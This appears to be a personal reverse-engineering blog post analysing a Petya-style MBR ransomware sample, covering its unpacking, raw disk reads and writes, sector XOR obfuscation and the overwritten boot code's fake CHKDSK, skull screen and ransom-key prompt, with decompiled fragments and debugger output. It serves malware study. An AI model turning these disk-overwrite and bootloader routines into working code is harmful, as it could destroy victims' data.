---
ID: 20250225122153
date: 2025-02-25
tags:
  - Blogging
Created: 2025-02-25:12:21:39
Last Modified: 2025-02-25:12:21:50
---
![[Pasted image 20250228134053.png]]
# Description

In the previous post on [[20250222215149 - BLG - Analysis on Destructive MEMZ's Master Boot Record (MBR)|MEMZ Trojan]], I have attempted to analyze the MBR to see how Nyan cat animation occurs and how sounds were made. The purpose for this analysis is to get familiar with MBR analysis and to experiment with real world malware which might come in useful in future reverse engineering efforts that deals directly with the MBR. This sample was chosen simply because it was on a Google search with MBR corruption.

# Sample Details

Name: `Nero V1.40.exe`
SHA256: 26b4699a7b9eeb16e76305d843d4ab05e94d43f3201436927e13b3ebafa90739
File Type : PE32 
Debugger : 
	- x32dbg (Sample)
	- WinDbg (MBR)

![[Pasted image 20250225122448.png]]

# Detonation

![[Pasted image 20250225123228.png]]


![[Pasted image 20250225123245.png]]

After clicking on yes, the computer restarted.
We see the CHKDSK message and that is is repairing sector.

![[Pasted image 20250225123342.png]]
There is then this blinking page with the "PRESS ANY KEY" string at the bottom 

After which, we get the following

![[Pasted image 20250225123438.png]]

## Everything Before `WinMain`

During the debugging, it seems that the code did not make it to the `WinMain` function which is interesting. It turns out that there is this `_calloc_crt` function that has the first call to `sub_41A8DA` which contains some form of decryption which lead to creation of RWX page which is suspicious to me. 
![[Pasted image 20250225133708.png]]

Breakpoint at 0x41ad2c reveals that the address to mark as RWX (0x40) would be 
Address: 0x41ad73 
Size: 0xc1f0
Original Protection : 0x20

![[Pasted image 20250225134942.png]]

Example of such decryption would be to reveal new MZ file (DLL). The instructions in the figure below is something that has been decrypted by the earlier discussed routine. The dump shows the production of some bytes of a new MZ file which we can dump later on.

![[Pasted image 20250225142936.png]]

After dumping more contents from the file. It seems that we have found the string of the supposed site that was found when [[#Detonation|detonating]] the malware.

![[Pasted image 20250225143232.png]]

After this, the path `\\.\C:` was open to allow read and write.

![[Pasted image 20250225143957.png]]

After which it makes use of DeviceIOControl Control Code 0x560000 which maps to  [IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS](https://learn.microsoft.com/en-us/windows/win32/api/winioctl/ni-winioctl-ioctl_volume_get_volume_disk_extentsb) which retrieves the physical location of a specified volume on one or more disks. The output shows that there is just one volume which is the `C:\` drive. It then copy the string `\\.\PhysicalDrive0` via the `movs(d/b)` 

![[Pasted image 20250225151332.png]]

Once the string has been set, it would then call `CreatefileA`and get information on the disk via DeviceIoControl with control word `IOCTL_DISK_GET_PARTITION_INFO_EX` to get the partition style. The output buffer would be [PARTITION_INFORMATION_EX](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntdddisk/ns-ntdddisk-_partition_information_ex)

![[Pasted image 20250225151639.png]]

```C
typedef struct _PARTITION_INFORMATION_EX { 
	PARTITION_STYLE PartitionStyle; 
	LARGE_INTEGER StartingOffset; 
	LARGE_INTEGER PartitionLength; 
	ULONG PartitionNumber; 
	BOOLEAN RewritePartition; 
	BOOLEAN IsServicePartition; 
	union { 
		PARTITION_INFORMATION_MBR Mbr;in
		PARTITION_INFORMATION_GPT Gpt; 
	} DUMMYUNIONNAME; 
} PARTITION_INFORMATION_EX, *PPARTITION_INFORMATION_EX;
```

In this environment, we got back `PARTITION_STYLE_MBR (0)`. The following shows the struct of `PARTITION_STYLE` and would default to raw (2) if there is an error.

```c
typedef enum _PARTITION_STYLE { 
	PARTITION_STYLE_MBR, 
	PARTITION_STYLE_GPT, 
	PARTITION_STYLE_RAW 
} PARTITION_STYLE;
```

The following is the overview of the MBR reading

```c
BOOL __fastcall ReadMBR_sub_10A0EE(LPCSTR lpFileName, int output_buffer_MBR, unsigned __int64 sector_offset)
{
  int hFile; // esi
  int bytesRead; // [esp+Ch] [ebp-4h] BYREF

  // CreateFile   \\.\PhysicalDrive0
  hFile = CreateFile(lpFileName, 0x80000000, 1, 0, 3, 0, 0);

  if ( hFile == -1 )
  {

    // CloseHandle
    CloseHandle(-1);
    return 0;
  }

  // SetFilePointerEx
  // Essentially <<9 is multiply offset by sector of size 512
  SetFilePointerEx(hFile, (_DWORD)sector_offset << 9, sector_offset >> 23, 0, 0);

  // ReadFile
  if ( !ReadFile(hFile, output_buffer_MBR, 512, &bytesRead, 0) )
    return 0;

  // CloseHandle
  CloseHandle(hFile);
  return bytesRead == 512;                      // MBR size
}
```


Let's step through and view the MBR that was being read by the malware. Here is before the read where the output would be stored to `0x12f8f8`
![[Pasted image 20250225153104.png]]

The output of the MBR can be found in the following. 



![[Pasted image 20250225154719.png]]

After that, it does some processing to what was being read. The figure shown previously was not accepted and the MBR was re-read again:

![[Pasted image 20250225155137.png]]


Eventually, it would still read the next `0x20` number of 512 bytes after the initial 512 bytes of MBR which should be the kernel module that would be loaded by the MBR.
We can see that there are strings that was seen during the [[#Detonation]] which shows us that this are the bytes that would be used for overwriting the MBR.

![[Pasted image 20250225163038.png]]

During this function call, it would XOR another `k -2`of 512 bytes (just another layer of obfuscation of other sections and payloads) and write it into a different segment address (Not the Boot Sector). p

```c
  for ( k = 1; k < 34; ++k )
  {
    v22 = k >> 31;
    ReadMBR_sub_10A0EE((LPCSTR)v23, (int)v30, k);
    for ( m = 0; m < 0x200; ++m )
      v30[m] ^= 0x37u;
    if ( !sub_10A163((int)v23, (int)v30, __PAIR64__(v22, k)) )
      return 0;
  }
```

Here is an example of the XOR.
![[Pasted image 20250225164118.png]]

After writing those data, it would then replace the original MBR boot sector 0 with the NotPetya's MBR.

![[Pasted image 20250225165638.png]]

We can tell that because looking through the code, we can see the strings that were present during the [[#Detonation]].

![[Pasted image 20250225165716.png]]

# `NotPetya` MBR Dump

By dumping those bytes, we can make use of this MBR for actual debugging in QEMU. For dumping I found that `Winpmem` tool was the most effective one.

![[Pasted image 20250301193814.png]]

Note that MBR starts from Real Mode, we will probably need to (unless there is a trick), to disassemble these as 16 bits real mode separate from the rest. We can choose to extract the and analyze the original MBR in another IDA instance.

After overwriting bootloader, there was attempt to adjust token privileges and call undocumented API for `ZwRaiseHardError`. According to [http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtSetDefaultHardErrorPort.html](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtSetDefaultHardErrorPort.html), it requires `SE_TCB_PRIVILEGE` which was from `ntdll`

This is tricky because causes the system to restart somehow. Therefore, setting breakpoint after the final copy of MBR bytes and killing the malware process would help with the extraction of MBR.

![[Pasted image 20250226140942.png]]

> [!success] Tip for the future
> Set a lower RAM size so that this process would be sped up with smaller size.

## Debugging with GDB

If you would like to try it out, the MBR is uploaded to [Github](https://github.com/Owl4444/NotPetya_MBR_Analysis) 

For the debugging setup, I used QEMU similar to the [[20250222215149 - BLG - Analysis on Destructive MEMZ's Master Boot Record (MBR)|MEMZ Blogpost]].
### Running Qemu

```bash
qemu-system-i386 -drive file=boot.img,format=raw   -vga std -s -S
```

### Running GDB

The following instruction is used during this analysis all thanks to [https://astralvx.com/debugging-16-bit-in-qemu-with-gdb-on-windows/](https://astralvx.com/debugging-16-bit-in-qemu-with-gdb-on-windows/) which has also supplied the three files that helped with the debugging setup.

```bash
gdb  -ix "gdb_init_real_mode.txt" -ex "set tdesc filename target.xml" -ex "target remote localhost:1234" -ex "br *0x7c00" -ex "c"
```

We should be able to see the registers, `DS:SI` and `ES:DI` memory region which is really useful when it comes to string operations. 

![[Pasted image 20250301200103.png]]
# Analyzing the MBR

I have rebased the segment and decompiling as real mode 16 bits raw binary.  I have tried with various tools:
1. Ghidra (Good for high level decompilation)
	1. Not perfect but better than nothing
2. IDA Pro
	1. Comments were particularly helpful
3. Binary Ninja
	1. A little wonky but could easily allow me to change, copy and paste bytes where necessary
		1. Example: Copying 0x2000 bytes from 0xC000 to 0x8000

![[Pasted image 20250228200840.png]]

We see that there is an unconditional jump to unk_8000 which would be populated by `sub_7c38` which read from disk.
# Initial Disk Reading sub_7C38
`
`sub_7C38` would copy 0x20 (passed in as 0x20 in `eax` in caller) sectors number of sectors into 0x8000.

![[Pasted image 20250301012829.png]]
1. Referencing https://wiki.osdev.org/Disk_access_using_the_BIOS_(INT_13h)
2. Read from the C drive with  Disk Address Packet in memory located at  `DS:SI` -> Disk Address Packet in memory `0000:7bdc`. 
3. 512 bytes (1 sector) is being transferred to destination (`0000:8000`)
4. That 512 bytes is transferred from 0xc000
	1. 0x22 in Load addr refers to how many sectors it is from sector 0
	2. `0x7c00+0x200*0x22 = 0xc000`

In the following GDB output, we see that the Disk Address Packet is as follows

```
Offset	Size	Description
 0	    1	    size of packet (24 bytes)
 1	    1	    always 0
 2	    2	    number of sectors to transfer (max 127 on some BIOSes)
 4	    4	    transfer buffer (0xFFFF:0xFFFF)
 8	    4	    lower 32-bits of starting 48-bit LBA
12	    4	    upper 32-bits of starting 48-bit LBA
16	    4	    lower 32-bits of load address
20	    4	    upper 32-bits of load address


size of packet              : 10
always 0                    : 00
Number of sectors           : 0001
Transfer Buffer             : 00008000   <--- Write Disk content to 0x8000
Lower 32 bits 48 bit LBA    : 00000022   <--- Where to get the content from
Upper 32 bits 48 bit LBA    : 00000000
Lower 32 bits of Load addr  : 00000022 
Upper 32 bits of Load addr  : 00000000

```

These values are obtained from the debugger. We can see the Disk Address Packet also from the following:

```
(remote) gef➤  context
---------------------------[ STACK ]---
0010 0001 8000 0000 0022 0000 0000 0000 
0022 0000 0000 0000 0000 0000 0080 0020 
---------------------------[ DS:SI ]---
00007BDC: 10 00 01 00 00 80 00 00 22 00 00 00 00 00 00 00  ........".......
00007BEC: 22 00 00 00 00 00 00 00 00 00 00 00 80 00 20 00  "...............
00007BFC: 00 00 24 7C FA 66 31 C0 8E D0 8E C0 8E D8 BC 00  ..$|.f1.........
00007C0C: 7C FB 88 16 93 7C 66 B8 20 00 00 00 66 BB 22 00  |....|f.....f.".
---------------------------[ ES:DI ]---
00007BEC: 22 00 00 00 00 00 00 00 00 00 00 00 80 00 20 00  "...............
00007BFC: 00 00 24 7C FA 66 31 C0 8E D0 8E C0 8E D8 BC 00  ..$|.f1.........
00007C0C: 7C FB 88 16 93 7C 66 B8 20 00 00 00 66 BB 22 00  |....|f.....f.".
00007C1C: 00 00 B9 00 80 E8 14 00 66 48 66 83 F8 00 75 F5  ........fHf...u.
----------------------------[ CPU ]----
AX: 4200 BX: 0022 CX: 8000 DX: 0080
SI: 7BDC DI: 7BEC SP: 7BDC BP: 0000
CS: 0000 DS: 0000 ES: 0000 SS: 0000

IP: 7C58 EIP:00007C58
CS:IP: 0000:7C58 (0x07C58)
SS:SP: 0000:7BDC (0x07BDC)
SS:BP: 0000:0000 (0x00000)
OF <0>  DF <0>  IF <1>  TF <0>  SF <0>  ZF <1>  AF <0>  PF <1>  CF <0>
ID <0>  VIP <0> VIF <0> AC <0>  VM <0>  RF <0>  NT <0>  IOPL <0>
---------------------------[ CODE ]----
=> 0x7c58:      int    0x13
   0x7c5a:      mov    sp,di
   0x7c5c:      pop    ebx
   0x7c5e:      pop    eax
   0x7c60:      jae    0x7c6a
   0x7c62:      push   ax
   0x7c63:      xor    ah,ah
   0x7c65:      int    0x13
   0x7c67:      pop    ax
   0x7c68:      jmp    0x7c40
(remote) gef➤  i r si ah dl 
si             0x7bdc              31708
ah             0x42                66
dl             0x80                -128

```

From there, we can verify that memory location 0x8000 now contain new instructions.

![[Pasted image 20250228201441.png]]

We can confirm this in HxD as well. We can check at `0xC000 - 0x7c00 = 0x4400`

![[Pasted image 20250228202629.png]]

The following would patch out the 0x8000 bytes with 0xc000 to mimic this for analysis in Binary Ninja.

```python
data = bv.read(0xc000, 0x4000)
bv.write(0x8000, data)
bv.update_analysis()
```

# `scanAllHardDrivesForPartitions`

```c
undefined2 __cdecl16near scanAllHardDrivesForPartitions_FUN_0000_8bbc(int param_1)

{
  byte bVar1;
  uint uVar2;
  char *pcVar3;
  ulong uVar4;
  undefined *puVar5;
  uint unaff_BP;
  undefined2 unaff_SS;
  undefined2 unaff_DS;
  char mbrBuffer [454];
  long alStack_4c [14];
  int MBR_Signature;
  undefined local_12 [5];
  byte driveRecordIndex;
  ulong local_c;
  ulong tempDriveParams;
  byte driveIndex;
  byte partitionIndex;
  undefined2 uVar6;
  
  driveRecordIndex = 0;
  _partitionIndex = (uint3)unaff_BP << 8;
  for (driveIndex = 0; driveIndex < 0x10; driveIndex = driveIndex + 1) {
    puVar5 = (undefined *)((uint)driveIndex * 8 + param_1);
    puVar5[2] = 0;
    puVar5[1] = 0;
    *puVar5 = 0;
    *(undefined4 *)(puVar5 + 4) = 0;
  }
  driveIndex = 0;
  do {
    uVar2 = Get_Drive_Parameters_0000_8cf2
                      (CONCAT11((char)((uint)local_12 >> 8),driveIndex + 0x80),local_12);
    uVar4 = (ulong)uVar2;
    if ((char)uVar2 == '\0') {
      pcVar3 = (char *)biosExtDiskAccess_0000_8db2
                                 (CONCAT11((char)((uint)mbrBuffer >> 8),driveIndex + 0x80),mbrBuff er
                                  ,0,0,1,0);
      if ((char)pcVar3 == '\0') {
        local_c = 0;
        pcVar3 = mbrBuffer;
        tempDriveParams = CONCAT22(pcVar3,(undefined2)tempDriveParams);
        if (MBR_Signature == -0x55ab) {
          _partitionIndex = _partitionIndex & 0xffff00;
          do {
            tempDriveParams =
                 alStack_4c[(_partitionIndex & 0xff) * 4] +
                 alStack_4c[(_partitionIndex & 0xff) * 4 + 1];
            if (local_c < tempDriveParams) {
              local_c = tempDriveParams;
            }
            bVar1 = partitionIndex + 1;
            uVar6 = (undefined2)(_partitionIndex >> 8);
            _partitionIndex = CONCAT21(uVar6,bVar1);
          } while (bVar1 < 4);
          *(undefined *)((uint)driveRecordIndex * 8 + param_1 + 1) = 1;
          for (partitionIndex = 0; partitionIndex < 4; partitionIndex = partitionIndex + 1) {
            if (mbrBuffer[partitionIndex] != *(char *)(partitionIndex + 0x9718)) {
              *(undefined *)((uint)driveRecordIndex * 8 + param_1 + 1) = 0;
              break;
            }
          }
          pcVar3 = (char *)((uint)driveRecordIndex * 8 + param_1);
          pcVar3[2] = '\x01';
          *pcVar3 = driveIndex + 0x80;
          *(ulong *)(pcVar3 + 4) = local_c;
          driveRecordIndex = driveRecordIndex + 1;
          _partitionIndex = CONCAT21(uVar6,1);
          uVar4 = local_c;
          goto LAB_0000_8cdf;
        }
      }
      uVar4 = ZEXT24(pcVar3);
    }
LAB_0000_8cdf:
    driveIndex = driveIndex + 1;
    if (0xf < driveIndex) {
      return (int)CONCAT31((int3)(uVar4 >> 8),partitionIndex);
    }
  } while( true );
}
```

Checking and parsing MBR Partition (Last 64 bytes excluding Signature AA55). You can see the first byte is 0x80 which refers to bootable. It has the value 7 at byte 4 (5th byte) which signals that this is an NTFS partition. The last two bytes in the following shows the bytes to be compared. 

The four long rectangles shows the different partitions (4 maximum). From the following figure, it shows that there is just one bootable partition that is of NTFS format with the LBA of 0x800 and size of 0x7fff000 sectors which estimate to be `0x7fff000 * 0x200 / 1000000000 = 68.717 Gb `To view this, we can set a breakpoint at `0x00008c3d`:

![[Pasted image 20250301052355.png]]

# Scrolling Up One Line

The following reveals how the scrolling works!

```c
undefined  __cdecl16near  Scroll_Up_One_Line0000_8aa8 (un  
	0000:8aa8 55              PUSH       BP
	0000:8aa9 8b  ec           MOV        BP ,SP
	0000:8aab 8a  7e  04       MOV        BH ,byte ptr [BP  + param_1 ]
	0000:8aae 33  c9           XOR        CX ,CX
	
                             scroll up window
                             DH = 0x18 (row of bottom-right corner)
                             DL = 0x4f (column of bottom-right corner)
                             CX = 0x00
                             BH = Fill Attribute (attribute for new line)
                             AX = 0x600, AL = 0 (clear) , AH = 6 (scroll up)
                             
	0000:8ab0 ba  4f  18       MOV        DX ,0x184f
	0000:8ab3 b8  00  06       MOV        AX ,0x600
	0000:8ab6 cd  10           INT        0x10
	
						 BH = 0 (page number = 0)
						 DX = 0; DH = row 0, dl = column 0
						 AH = 2 (Set cursor position)
						 This resets cursor position
						 
	0000:8ab8 32  ff           XOR        BH ,BH
	0000:8aba 33  d2           XOR        DX ,DX
	0000:8abc b4  02           MOV        AH ,0x2
	0000:8abe cd  10           INT        0x10
	0000:8ac0 c9              LEAVE
	0000:8ac1 c3              RET
```


# Printing the Skull 

The long strings are the ASCII art for the skull!

```c
void __cdecl16near Print_Skull_and_Press_any_key_FUN_0000_887e(undefined param_1)
{
  Scroll_Up_One_Line0000_8aa8(param_1);
  PrintLightGrayString_0000_87b8(0x20,0x20);
  FUN_0000_8736((char *)s_uu$$$$$$$$$$$uu_0000_9c42);
  PrintLightGrayString_0000_87b8(0x20,0x1d);
  FUN_0000_8736((char *)s_uu$$$$$$$$$$$$$$$$$uu_0000_9c54);
  PrintLightGrayString_0000_87b8(0x20,0x1c);
  FUN_0000_8736((char *)s_u$$$$$$$$$$$$$$$$$$$$$u_0000_9c6c);
  PrintLightGrayString_0000_87b8(0x20,0x1c);
  FUN_0000_8736((char *)s_u$$$$$$$$$$$$$$$$$$$$$$$u_0000_9c86);
  PrintLightGrayString_0000_87b8(0x20,0x1a);
  FUN_0000_8736((char *)s_u$$$$$$$$$$$$$$$$$$$$$$$$$u_0000_9ca2);
  PrintLightGrayString_0000_87b8(0x20,0x1a);
  FUN_0000_8736((char *)s_u$$$$$$$$$$$$$$$$$$$$$$$$$u_0000_9ca2);
  PrintLightGrayString_0000_87b8(0x20,0x1a);
  FUN_0000_8736((char *)s_u$$$$$$*_*$$$*_*$$$$$$u_0000_9cc0);
  PrintLightGrayString_0000_87b8(0x20,0x1a);
  FUN_0000_8736((char *)s_*$$$$*_u$u_$$$$*_0000_9cde);
  PrintLightGrayString_0000_87b8(0x20,0x1b);
  FUN_0000_8736((char *)s_$$$u_u$u_u$$$_0000_9cfc);
  PrintLightGrayString_0000_87b8(0x20,0x1b);
  FUN_0000_8736((char *)s_$$$u_u$$$u_u$$$_0000_9d18);
  PrintLightGrayString_0000_87b8(0x20,0x1c);
  FUN_0000_8736((char *)s_*$$$$uu$$$_$$$uu$$$$*_0000_9d34);
  PrintLightGrayString_0000_87b8(0x20,0x1d);
  FUN_0000_8736((char *)s_*$$$$$$$*_*$$$$$$$*_0000_9d4e);
  PrintLightGrayString_0000_87b8(0x20,0x1f);
  FUN_0000_8736((char *)s_u$$$$$$$u$$$$$$$u_0000_9d66);
  PrintLightGrayString_0000_87b8(0x20,0x20);
  FUN_0000_8736((char *)s_u$*$*$*$*$*$*$u_0000_9d7a);
  PrintLightGrayString_0000_87b8(0x20,0x15);
  FUN_0000_8736((char *)s_uuu_$$u$_$_$_$_$u$$_uuu_0000_9d8c);
  PrintLightGrayString_0000_87b8(0x20,0x14);
  FUN_0000_8736((char *)s_u$$$$_$$$$$u$u$u$$$_u$$$$_0000_9db4);
  PrintLightGrayString_0000_87b8(0x20,0x15);
  FUN_0000_8736((char *)s_$$$$$uu_*$$$$$$$$$*_uu$$$$$$_0000_9dde);
  PrintLightGrayString_0000_87b8(0x20,0x13);
  FUN_0000_8736((char *)s_u$$$$$$$$$$$uu_*****_uuuu$$$$$$$_0000_9e06);
  PrintLightGrayString_0000_87b8(0x20,0x13);
  FUN_0000_8736((char *)s_$$$$***$$$$$$$$$$uuu_uu$$$$$$$$$_0000_9e32);
  PrintLightGrayString_0000_87b8(0x20,0x14);
  FUN_0000_8736((char *)s_***_**$$$$$$$$$$$uu_**$***_0000_9e5e);
  PrintLightGrayString_0000_87b8(0x20,0x1d);
  FUN_0000_8736((char *)s_uuuu_**$$$$$$$$$$uuu_0000_9e80);
  PrintLightGrayString_0000_87b8(0x20,0x14);
  FUN_0000_8736((char *)s_u$$$uuu$$$$$$$$$uu_**$$$$$$$$$$$_0000_9e98);
  PrintLightGrayString_0000_87b8(0x20,0x14);
  FUN_0000_8736((char *)s_$$$$$$$$$$****_**$$$$$$$$$$$*_0000_9ec2);
  PrintLightGrayString_0000_87b8(0x20,0x16);
  FUN_0000_8736((char *)s_*$$$$$*_**$$$$**_0000_9eec);
  PrintLightGrayString_0000_87b8(0x20,0x18);
  FUN_0000_8736((char *)s_$$$*_PRESS_ANY_KEY!_$$$$*_0000_9f14);
  return;
}
```

```c
void __cdecl16near PrintLightGrayString_0000_87b8(undefined string_to_print,int length)
{
  while (0 < length) {
    PrintLightGrayCharacter_0000_8726(string_to_print);
    length = length + -1;
  }
  return;
}
```

Color is specified with BL = 7 to do Teletype Output.

```c
 undefined  __cdecl16near  PrintLightGrayCharacter_0000_872
 
		BL = 7 (LightGray) AL = Character AH = Teletype 
		Output BH = 0 (Page number 0)

       0000:8726 55              PUSH       BP
       0000:8727 8b  ec           MOV        BP ,SP
       0000:8729 bb  07  00       MOV        BX ,0x7  
       0000:872c 8a  46  04       MOV        AL ,byte ptr [BP  + param_1 ]
       0000:872f b4  0e           MOV        AH ,0xe
       0000:8731 cd  10           INT        0x10
       0000:8733 c9              LEAVE
       0000:8734 c3              RET

```

Setting breakpoint at 0x8a1a should give us the first print of the skull.

![[Pasted image 20250301025737.png]]

# Scanning All HardDrives for Partitions

# Printing "Repair Message"

![[Pasted image 20250225123342.png]]
This repair message only surface once (only during the first boot) which is called in `FUN_0000_8640`. After this whole `CHKDSK` saga is over, it will print the ransom note.

```c
void __cdecl16near
Repair_0000_8102(undefined2 param_1,undefined2 param_2_00,undefined2 param_3,undefined param _2)

{
  code *pcVar1;
  char cVar2;
  undefined2 unaff_SS;
  ulong local_1226;
  undefined local_1222 [32];
  undefined local_1202 [4096];
  undefined local_202;
  undefined local_201 [32];
  undefined local_1e1 [479];
  
  Print_String_Gray_FUN_0000_8736((char *)s_Repairing_file_system_on_C:_The_t_0000_9764);
  cVar2 = biosExtDiskAccess_0000_8db2
                    (CONCAT11((char)((uint)&local_202 >> 8),param_2),&local_202,0x36,0,1,0);
  if (cVar2 != '\0') {
    FUN_0000_8a76();
    return;
  }
  local_202 = 1;
  for (local_1226 = 0; local_1226 < 0x20; local_1226 = local_1226 + 1) {
    local_1222[(int)local_1226] = local_201[(int)local_1226];
    local_201[(int)local_1226] = 0;
  }
  for (local_1226 = 0; local_1226 < 0x20; local_1226 = local_1226 + 1) {
    biosExtDiskAccess_0000_8db2
              (CONCAT11((char)((uint)&local_202 >> 8),param_2),&local_202,0x36,0,1,1);
  }
  biosExtDiskAccess_0000_8db2(param_2,local_1202,0x37,0,1,0);
  FUN_0000_90b2(local_1222,local_1e1,0,local_1202,0x200);
  biosExtDiskAccess_0000_8db2(CONCAT11((char)((uint)local_1202 >> 8),param_2),local_1202,0x37,0, 1,1)
  ;
  FUN_0000_916e(param_1,local_1222,local_1e1,(char *)s_CHKDSK_is_repairing_sector_0000_98f6,1);
  push_7_scroll_up_one_line_8aa8();
  pcVar1 = (code *)swi(0x19);
  (*pcVar1)();
  return;

```


# Printing "Ransom Note"

![[Pasted image 20250225123438.png]]

It seems as though there is a decryption routine if you were to put in the "correct" purchased key. 

```c
void __cdecl16near RansomNote_and_enter_key_0000_858e(undefined2 param_1,undefined param_2)

{
  byte bVar1;
  uint3 uVar2;
  char result;
  undefined2 uVar3;
  undefined2 unaff_BP;
  undefined2 unaff_SS;
  undefined local_24e [41];
  undefined local_225 [128];
  undefined local_1a5 [343];
  undefined local_4e [75];
  char local_3;
  
  _local_3 = CONCAT21(unaff_BP,local_3);
  FUN_0000_8838();
  biosExtDiskAccess_0000_8db2(CONCAT11((char)((uint)local_24e >> 8),param_2),local_24e,0x36,0,1, 0);
  Print_String_Gray_FUN_0000_8736((char *)s_You_became_victim_of_the_PETYA_R_0000_994a);
  PrintLightGrayString_0000_87b8((undefined *)&DAT_0000_ffdc,0x50);
  Print_String_Gray_FUN_0000_8736((char *)s_The_harddisks_of_your_computer_h_0000_9978);
  Print_String_Gray_FUN_0000_8736(local_225);
  Print_String_Gray_FUN_0000_8736((char *)s_3._Enter_your_personal_decryptio_0000_9b76);
  FUN_0000_8a1c(local_1a5);
  Print_String_Gray_FUN_0000_8736((undefined *)&DAT_0000_9bae);
  FUN_0000_8ac2();
  Print_String_Gray_FUN_0000_8736((char *)s_If_you_already_purchased_your_ke_0000_9bb4);
  while( true ) {
    Print_String_Gray_FUN_0000_8736((char *)s_Key:_0000_9bf4);
    _local_3 = _local_3 & 0xffff00;
    do {
      local_4e[_local_3 & 0xff] = 0;
      bVar1 = local_3 + 1;
      uVar2 = _local_3 >> 8;
      _local_3 = CONCAT21((int)uVar2,bVar1);
    } while (bVar1 < 0x4a);
    uVar3 = Processing_KeyPress_0000_8b22(local_4e,0x49);
    result = Check_Input_Key_0000_8430
                       (param_1,CONCAT11((char)((uint)local_4e >> 8),param_2),local_4e,uVar3);
    if (result == '\x01') break;
    Print_String_Gray_FUN_0000_8736((char *)s_Incorrect_key!_Please_try_again._0000_9bfc);
  }
  return;
}
```


# `biosExtDiskAccess_0000_8db2`

## Read Operation

This function sets up the Packet structure which allows the developer to control the packet structure (where to write and from where.)
```c
undefined  __cdecl16near  biosExtDiskRW_0000_8d4a (undefi
           
       0000:8d4a c8  06  00       ENTER      0x6 ,0x0
                 00
       0000:8d4e 57              PUSH       DI
       0000:8d4f 56              PUSH       SI
       0000:8d50 8b  5e  06       MOV        BX ,word ptr [BP  + param_2 ]
       0000:8d53 c6  07  10       MOV        byte ptr [BX ],0x10
       0000:8d56 c6  47  01       MOV        byte ptr [BX  + 0x1 ],0x0
                 00
       0000:8d5a 8b  46  10       MOV        AX ,word ptr [BP  + param_4 ]
       0000:8d5d 89  47  02       MOV        word ptr [BX  + 0x2 ],AX
       0000:8d60 8d  7f  08       LEA        DI ,[BX  + 0x8 ]
       0000:8d63 8d  76  08       LEA        SI ,[BP  + param_3 ]
       0000:8d66 1e              PUSH       DS
       0000:8d67 07              POP        ES
       0000:8d68 66  a5           MOVSD      ES :DI ,SI
       0000:8d6a 66  a5           MOVSD      ES :DI ,SI
       0000:8d6c 80  7e  12       CMP        byte ptr [BP  + param_5 ],0x1
                 01
       0000:8d70 1a  c0           SBB        AL ,AL
       0000:8d72 24  ff           AND        AL ,0xff
       0000:8d74 04  43           ADD        AL ,0x43
       0000:8d76 88  46  fe       MOV        byte ptr [BP  + local_4 ],AL
       0000:8d79 c6  46  fa       MOV        byte ptr [BP  + local_8 ],0x3
                 03
                             LAB_0000_8d7d                                   XREF[1]:     0000:8da9 (j)   
       0000:8d7d c6  46  fc       MOV        byte ptr [BP  + local_6 ],0x0
                 00
       0000:8d81 bb  aa  55       MOV        BX ,0x55aa
                             DL = 0 :  1st floppy disk (Drive A:)
                             DL = 1 :  2nd floppy disk (Drive B:)
                             DL = 2 :  3rd floppy disk (Drive C:)
                             ...
                             DL = 7F : 128th floppp disk
                             DL = 0x80: 1st hard disk
                             DL = 0x81 : 3rd harddisk
                             ...
                             DL = 0xe0 = CD/DVD or 97th harddisk
                             ...
                             DL = FFh : 128th harddisk
       0000:8d84 8a  56  04       MOV        DL ,byte ptr [BP  + param_1 ]
       0000:8d87 8b  76  06       MOV        SI ,word ptr [BP  + param_2 ]
       0000:8d8a 8a  66  fe       MOV        AH ,byte ptr [BP  + local_4 ]
       0000:8d8d 32  c0           XOR        AL ,AL
       0000:8d8f cd  13           INT        0x13
       0000:8d91 73  03           JNC        LAB_0000_8d96
       0000:8d93 88  66  fc       MOV        byte ptr [BP  + local_6 ],AH
                             LAB_0000_8d96                                   XREF[1]:     0000:8d91 (j)   
       0000:8d96 80  7e  fc       CMP        byte ptr [BP  + local_6 ],0x11
                 11
       0000:8d9a 75  04           JNZ        LAB_0000_8da0
       0000:8d9c c6  46  fc       MOV        byte ptr [BP  + local_6 ],0x0
                 00
                             LAB_0000_8da0                                   XREF[1]:     0000:8d9a (j)   
       0000:8da0 80  7e  fc       CMP        byte ptr [BP  + local_6 ],0x0
                 00
       0000:8da4 74  05           JZ         LAB_0000_8dab
       0000:8da6 fe  4e  fa       DEC        byte ptr [BP  + local_8 ]
       0000:8da9 75  d2           JNZ        LAB_0000_8d7d
                             LAB_0000_8dab                                   XREF[1]:     0000:8da4 (j)   
       0000:8dab 8a  46  fc       MOV        AL ,byte ptr [BP  + local_6 ]
       0000:8dae 5e              POP        SI
       0000:8daf 5f              POP        DI
       0000:8db0 c9              LEAVE
       0000:8db1 c3              RET

```

Here is an example when the malware tries to look for the ransomware onion site:

The  `ds:si` which contains the following format:
- Size of packet = 16 bytes
- Number of sector to transfer (512 bytes)
- Content would be read to `0000:7722`
- 48 bit starting LBA : 0x000036 (`0x36 * 0x200 = 0x6C00`)

```c
Offset	Size	Description
 0	1	size of packet (16 bytes)
 1	1	always 0
 2	2	number of sectors to transfer (max 127 on some BIOSes)
 4	4	transfer buffer (16 bit segment:16 bit offset) (see note #1)
 8	4	lower 32-bits of 48-bit starting LBA
12	4	upper 16-bits of 48-bit starting LBA
```

This means that the LBA of 0x36 is offset of 0x6c00 (from the start of sector 0). To verify this, lets take a look at the content in 0x6C00 which we will want to read and verifying with the before and after image at memory address (0x7722)

The following shows the content of the transfer buffer BEFORE the Disk Read Operation:

![[Pasted image 20250301134521.png]]

And the following is AFTER the read operation

![[Pasted image 20250301135841.png]]

We can verify the content where it was read from. Additionally, the personal decryption code is also found.

![[Pasted image 20250301135742.png]]

This  is the decryption code being displayed 

![[Pasted image 20250301161259.png]]

## Keyboard Handling

The local variable `local_4` is used to check if a key is present. When the BIOS Keyboard service is called with `AH = 1`. If the key is waiting, then BIOS clears the ZF and AH returns the scan code while AL contains the ASCII. The flag is then moved into AL before returning as result

This snippets shows how keyboard service is used to peek at the keyboard's buffer without consuming the key.

```c                          
       0000:8af2 c8  02  00       ENTER      0x2 ,0x0
                 00
       0000:8af6 c6  46  fe       MOV        byte ptr [BP  + local_4 ],0x0
                 00
       0000:8afa b4  01           MOV        AH ,0x1    ; BIOS: check for keystroke
